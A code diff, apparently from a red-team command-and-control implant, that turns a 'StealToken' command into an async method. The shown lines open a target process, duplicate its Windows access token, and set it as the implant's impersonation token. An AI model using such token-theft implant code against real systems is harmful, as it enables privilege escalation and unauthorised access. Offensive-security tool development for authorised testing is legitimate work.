@@ -3,7 +3,7 @@ using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
-
+using System.Threading.Tasks;
 using DInvoke.Data;
 
 namespace Drone.Commands;
@@ -16,7 +16,7 @@ public sealed class StealToken : DroneCommand
     public override byte Command => 0x2B;
     public override bool Threaded => false;
 
-    public override void Execute(DroneTask task, CancellationToken cancellationToken)
+    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         var pid = uint.Parse(task.Arguments[0]);
 
@@ -27,7 +27,7 @@ public sealed class StealToken : DroneCommand
 
         if (status != Native.NTSTATUS.Success)
         {
-            Drone.SendTaskError(task.Id, "Failed to open process handle.");
+            await Drone.SendTaskError(task.Id, "Failed to open process handle.");
             return;
         }
 
@@ -56,7 +56,7 @@ public sealed class StealToken : DroneCommand
             throw new Win32Exception(Marshal.GetLastWin32Error());
 
         using var identity = new WindowsIdentity(hTokenDup);
-        Drone.SendTaskOutput(task.Id, $"Impersonated token for {identity.Name}.");
+        await Drone.SendTaskOutput(task.Id, $"Impersonated token for {identity.Name}.");
         Drone.ImpersonationToken = hTokenDup;
     }
 }
